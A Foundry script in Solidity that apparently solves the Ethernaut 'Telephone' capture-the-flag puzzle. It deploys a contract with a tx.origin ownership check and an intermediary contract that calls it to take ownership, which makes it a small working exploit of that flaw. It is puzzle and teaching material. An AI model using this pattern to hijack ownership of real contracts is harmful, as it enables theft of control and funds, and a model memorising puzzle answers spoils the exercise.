// SPDX-License-Identifier: MIT
pragma solidity 0.8.21;

import {Script, console2} from "forge-std/Script.sol";

contract Test is Script {
    uint256 heroPrivateKey = vm.envUint("PRIVATE_KEY");

    function run() public {
        vm.startBroadcast(heroPrivateKey);

        Telephone telephone = new Telephone();
        address telephoneAddress = address(telephone);
        TelephoneCaller caller = new TelephoneCaller(telephoneAddress);

        console2.log("before invoke");
        caller.invoke();
        console2.log("after invoke");
    }
}

////////////////////////////////////////////////////////////////////////////////////
// Start of Ric Li C's Solution (Extra codes)
////////////////////////////////////////////////////////////////////////////////////
// Below are extra codes to help solve this puzzle

contract Telephone {
    address public owner;

    constructor() {
        owner = msg.sender;
    }

    function changeOwner(address _owner) public {
        console2.log("tx.origin is ", tx.origin);
        console2.log("msg.sender is ", msg.sender);
        if (tx.origin != msg.sender) {
            owner = _owner;
        }
    }
}

contract TelephoneCaller {
    Telephone telephone;

    constructor(address _telephoneAddress) {
        telephone = Telephone(_telephoneAddress);
    }

    function invoke() public {
        console2.log("msg.sender is ", msg.sender);
        telephone.changeOwner(msg.sender);
        console2.log("inside invoke");
    }
}
////////////////////////////////////////////////////////////////////////////////////
// End of Ric Li C's Solution (Extra codes)
////////////////////////////////////////////////////////////////////////////////////
